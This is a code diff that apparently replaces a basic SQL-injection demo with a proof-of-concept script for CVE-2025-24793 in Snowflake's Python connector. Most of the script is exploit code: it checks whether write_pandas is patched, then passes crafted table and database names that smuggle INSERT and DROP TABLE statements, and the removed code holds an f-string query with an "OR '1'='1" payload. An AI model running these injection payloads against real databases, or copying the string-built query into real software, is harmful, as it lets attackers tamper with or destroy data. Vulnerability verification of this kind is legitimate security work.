@@ -1,47 +1,92 @@
-import snowflake.connector
+# poc.py
+
 import toml
+import snowflake.connector
+from snowflake.connector.pandas_tools import write_pandas
+import pandas as pd
+import traceback
 
-# Load config from TOML
-config = toml.load("config.toml")["connections"]["my_example_connection"]
+def load_snowflake_config():
+    config = toml.load("config.toml")
+    conn = config["connections"]["my_example_connection"]
+    return {
+        "account": conn["account"],
+        "user": conn["user"],
+        "password": conn["password"],
+        "role": conn["role"],
+        "warehouse": conn["warehouse"],
+        "database": conn["database"],
+        "schema": conn["schema"]
+    }
 
-# Connect to Snowflake
-conn = snowflake.connector.connect(
-    user=config["user"],
-    password=config["password"],
-    account=config["account"],
-    role=config["role"],
-    warehouse=config["warehouse"],
-    database=config["database"],
-    schema=config["schema"]
-)
+def test_write_pandas(cursor, conn, df, table_name, db=None):
+    try:
+        print(f"[INFO] Writing DataFrame to table: {table_name}")
+        # Try writing using potential vulnerable API
+        write_pandas(conn, df, table_name=table_name, database=db, auto_create_table=True)
+        print(f"✅ [SUCCESS] DataFrame written to {table_name}")
+    except Exception as e:
+        print(f"❌ [ERROR] {str(e)}")
 
-cur = conn.cursor()
+def check_patch(cursor):
+    try:
+        import inspect
+        import snowflake.connector.pandas_tools
+        if "stage_location" in inspect.getsource(snowflake.connector.pandas_tools.write_pandas):
+            print("❌ [UNPATCHED] Vulnerable 'stage_location' argument found in write_pandas")
+        else:
+            print("✅ [PATCHED] No 'stage_location' parameter present")
+    except Exception:
+        print("⚠️  [UNKNOWN] Cannot determine patch status")
 
-def init_users_table():
-    cur.execute("CREATE OR REPLACE TABLE users (username STRING, password STRING);")
-    cur.execute("DELETE FROM users;")
-    cur.execute("INSERT INTO users VALUES ('guest', 'guestpass'), ('admin', 'adminpass');")
-    print("[INFO] Dummy users inserted.\n")
+def setup_environment(cursor):
+    cursor.execute("CREATE OR REPLACE TABLE legitimate_users(id INT, name STRING);")
+    cursor.execute("CREATE OR REPLACE TABLE sensitive_secrets(id INT, secret STRING);")
+    print("[SETUP] Created legitimate_users and sensitive_secrets tables")
 
-def vulnerable_lookup(user_input):
-    query = f"SELECT * FROM users WHERE username = '{user_input}'"
-    print(f"[DEBUG] Executing: {query}")
-    cur.execute(query)
-    return cur.fetchall()
+def cleanup_environment(cursor):
+    cursor.execute("DROP TABLE IF EXISTS legitimate_users;")
+    cursor.execute("DROP TABLE IF EXISTS sensitive_secrets;")
+    print("✅ [CLEANUP] Test tables removed")
 
-# Step 1: Setup dummy users
-init_users_table()
+def run_poc():
+    print("="*60)
+    print("CVE-2025-24793 PoC: Snowflake Connector Python - Auto Detection")
+    print("="*60)
 
-# Step 2: Normal user input
-print("[TEST] Legitimate user lookup:")
-result = vulnerable_lookup("guest")
-print("[RESULT]", result)
+    config = load_snowflake_config()
+    conn = snowflake.connector.connect(**config)
+    cursor = conn.cursor()
 
-# Step 3: SQL Injection attempt
-print("\n[TEST] SQL Injection attempt:")
-payload = "guest' OR '1'='1"
-result = vulnerable_lookup(payload)
-print("[RESULT]", result)
+    try:
+        setup_environment(cursor)
+        check_patch(cursor)
 
-cur.close()
-conn.close()
+        # Sample DataFrame
+        df = pd.DataFrame({"id": [1], "name": ["Nizen"]})
+
+        print("\n[TEST 1] Normal write_pandas usage:")
+        test_write_pandas(cursor, conn, df, "test_employees")
+
+        print("\n[TEST 2] SQL Injection via malicious table name:")
+        malicious_table = "injected_table; INSERT INTO sensitive_secrets VALUES (999, 'HACKED_VIA_CVE_2025_24793'); --"
+        test_write_pandas(cursor, conn, df, malicious_table)
+
+        print("\n[TEST 3] SQL Injection via malicious database name:")
+        malicious_db = "POC_DB'; DROP TABLE sensitive_secrets; SELECT 'injected"
+        test_write_pandas(cursor, conn, df, "legitimate_users", db=malicious_db)
+
+    except Exception as e:
+        print(f"❌ [FATAL ERROR] {str(e)}")
+        traceback.print_exc()
+    finally:
+        cleanup_environment(cursor)
+        cursor.close()
+        conn.close()
+
+    print("="*60)
+    print("CVE-2025-24793 PoC Complete")
+    print("="*60)
+
+if __name__ == "__main__":
+    run_poc()
